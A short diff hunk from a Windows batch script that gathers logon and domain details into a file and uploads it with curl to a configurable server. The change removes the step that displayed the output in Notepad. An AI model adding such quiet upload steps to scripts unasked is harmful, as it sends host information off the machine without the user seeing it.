@@ -40,7 +40,6 @@ echo Logon Server: %LOGONSERVER% >> "%OUTPUT%"
 echo.
 echo Done. Output saved to:
 echo %OUTPUT%
-start notepad "%OUTPUT%"
 
 REM Upload
 curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%
